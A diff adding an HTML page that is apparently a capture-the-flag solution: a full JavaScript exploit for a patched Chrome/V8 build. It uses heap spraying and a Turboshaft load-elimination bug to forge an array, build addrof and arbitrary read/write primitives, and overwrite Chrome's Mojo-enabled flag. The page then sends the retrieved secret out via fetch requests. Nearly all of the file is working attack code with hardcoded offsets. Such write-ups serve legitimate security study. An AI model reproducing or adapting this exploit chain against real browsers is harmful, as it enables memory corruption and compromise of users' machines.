@@ -1,0 +1,235 @@
+<hmtl>
+    <body>
+        <script src="./mojo_bindings/mojo_bindings.js"></script>
+        <script src="./mojo_bindings/third_party/blink/public/mojom/flag/flag.mojom.js"></script>
+        <script>
+
+/*
+This exploit uses the following steps to write to recover the flag:
+
+1. Spray a number of arraybuffers, and trigger a few GCs to move
+them into old space. We also allocate an array of floats to allocate 
+its map, and also move it to old space. We can use a debugger to read this map
+and it shouldnt change between executions.
+
+2. function `f` is crafted such that it triggers turboshaft load elimination
+on the load of a stack argument. Between the two loads, we spray an array of floats,
+encoding a fake array with the follow structure:
+
+[float array map][length][elements_store][empty properties]
+
+elements_store should point into the oldspace region containing the arraybuffers.
+
+3. Run f in a loop until the bug is triggered. Now we have an array that can
+read and write into oldspace. We use this to find and corrupt an arraybuffer.
+
+4. With an arraybuffer corrupted so that it gives r/w over the heap sandbox,
+we now need an addrof primitive. We can achieve this by setting an array of floats
+and an array of objects as elements of the victim arraybuffer, and using our 
+original corrupted array to read the location of it's element store.
+
+5. With it's address we can use the arraybuffer to point the float and object 
+arrays to the same backingstore, giving us addrof
+
+6. The challenge patch reverts arraybuffers and dataviews to not use bounded size.
+This means we can create an arraybuffer with an offset equal to the negative of an
+array buffers backingstore offset. This will allow the dataview to write anywhere.
+
+7. With arbitrary read/write, we use the exposed `leak` function to recover a pointer
+to the isolate. We read a chrome pointer out of the isolate, and write to the 
+`is_mojo_js_enabled_` flag, enabling mojo bindings in chrome. Now when we 
+refresh the page, mojo bindings will be enabled and we can call the flag function.
+We can recover its value by sending it as part of a request to our page.
+
+*/
+
+const workerFunc = () => {
+
+function gc() {
+    try {
+        new ArrayBuffer(1);
+        new ArrayBuffer(1);
+        new ArrayBuffer(2 ** 24);
+
+    } catch(e) {
+
+    }
+}
+
+let keep_ab = new Array(0x2000);
+for (let i = 0; i < 0x2000; i++) {
+    let b = new ArrayBuffer(0x101);
+    keep_ab[i] = b;
+}
+
+let test = [1.1];
+
+gc();
+gc();
+gc();
+gc();
+gc();
+
+let buf = new ArrayBuffer(8);
+
+let u64 = new BigUint64Array(buf);
+let u32 = new Uint32Array(buf);
+let f64 = new Float64Array(buf);
+let f32 = new Float32Array(buf);
+
+
+function ftoi(f) {
+    f64[0] = f;
+    return u64[0];
+}
+
+function itof(f) {
+    u64[0] = f;
+    return f64[0];
+}
+
+let fakearr0 = itof(0x0040d3c1f7fffffen);
+let fakearr1 = itof(0x0046203100000725n);
+
+function f(...args) {
+  let arr1 = new Array(0x3);
+
+  arr1[0] = args[0];
+
+  let spray;
+  let arr2;
+
+  for (let i = 0; i< 0x20000; i++) {
+    spray = [1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307,1.8720857472184475e-307,2.4615711382093203e-307];
+  }
+
+  arr2 = [arr1, spray[0]];
+  arr1[1] = args[0];
+  return arr2;
+
+}
+
+let t;
+let a;
+
+for (let i = 0; i < 0x400; i++) {
+    t = f({});
+    if (t[0][0] !== t[0][1]) {
+        console.log("mismatch after: " + i);
+        a = t[0][1];
+        break;
+    }
+}
+
+let idx;
+for (let i = 0x10; i < 0x30; i++) {
+    console.log(ftoi(a[i]).toString(16));
+    if (ftoi(a[i]) == 0x101n) {
+        idx = i;
+        a[i] = itof(0xffffffffffffffn);
+        a[i + 2] = itof(0n);
+
+        break;
+    }
+}
+
+let vic;
+console.log(keep_ab[0x800]);
+for (let i = 0; i < keep_ab.length; i++) {
+    if (keep_ab[i].byteLength != 0x101) {
+        vic = keep_ab[i];
+        break;
+    }
+}
+
+
+
+let lo = [{},{},{}];
+let lf = [1.1,1.1,1.1];
+
+vic[0] = lo;
+vic[1] = lf;
+
+
+let elems = Number((ftoi(a[idx - 2]) >> 32n) - 1n);
+
+console.log(elems.toString(16));
+t = null;
+a = null;
+
+let dv = new DataView(vic);
+
+console.log(dv.getUint32(0, true).toString(16));
+
+let ola = dv.getUint32(elems + 8, true) - 1;
+let fla = dv.getUint32(elems + 12, true) -1;
+console.log("fla: " + fla.toString(16));
+console.log("ola: " + ola.toString(16));
+let obs = dv.getUint32(ola + 8, true);
+console.log("obs: " + obs.toString(16));
+dv.setUint32(fla + 8, obs, true);
+let as = new ArrayBuffer(0x101);
+vic[0][0] = as;
+
+
+let leak_ab = ftoi(vic[1][0]);
+let asa = Number(leak_ab & 0xffffffffn) - 1;
+console.log(asa.toString(16));
+dv.setBigUint64(asa + 0x18, 0x7fffffffffffffffn);
+
+let asv = new DataView(as);
+vic[0][1] = asv;
+let leak_dv = ftoi(vic[1][0]);
+let asva = Number(leak_dv >> 32n) - 1;
+console.log(asva.toString(16));
+let base = dv.getBigUint64(0x48, true) & 0xfffffff00000000n;
+
+let offset = dv.getBigUint64(asa + 0x24, true) >> 24n;
+
+let buff_addr = base + offset;
+
+console.log(buff_addr.toString(16));
+
+dv.setBigUint64(asva + 0x18, -buff_addr, true);
+
+let isolate = leak();
+
+let chrome_leak = asv.getBigUint64(isolate + 0xe108, true) -0x1086d680n;
+console.log(chrome_leak.toString(16));
+let mojo_flag_addr = chrome_leak + 0x0000000010a040een
+
+asv.setBigUint64(Number(mojo_flag_addr), 0x0101010101010101n, true);
+
+postMessage({"m": 0});
+
+};
+
+let workerString = "(" + workerFunc + ")();"
+
+if (typeof(Mojo) !== "undefined") {
+        // ./chrome --enable-blink-features=MojoJS
+        fetch(window.location + "/WIN");
+        let flag;
+
+        let flagPtr = new blink.mojom.FlagPtr();
+        Mojo.bindInterface(blink.mojom.Flag.name, mojo.makeRequest(flagPtr).handle);
+
+        flagPtr.getFlag()
+          .then(res => {fetch(window.location + "/" + res.flag);});
+
+          flagPtr.getFlag()
+          .then(res => {console.log(res.flag);});
+        
+} else {
+    const blob = new Blob([workerString], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    const worker = new Worker(workerUrl);
+    worker.onmessage = function (e) {
+        console.log("message from worker");
+        window.location.href = "/solution.html";
+    }
+}
+
+        </script>
+    </body>
+</hmtl>
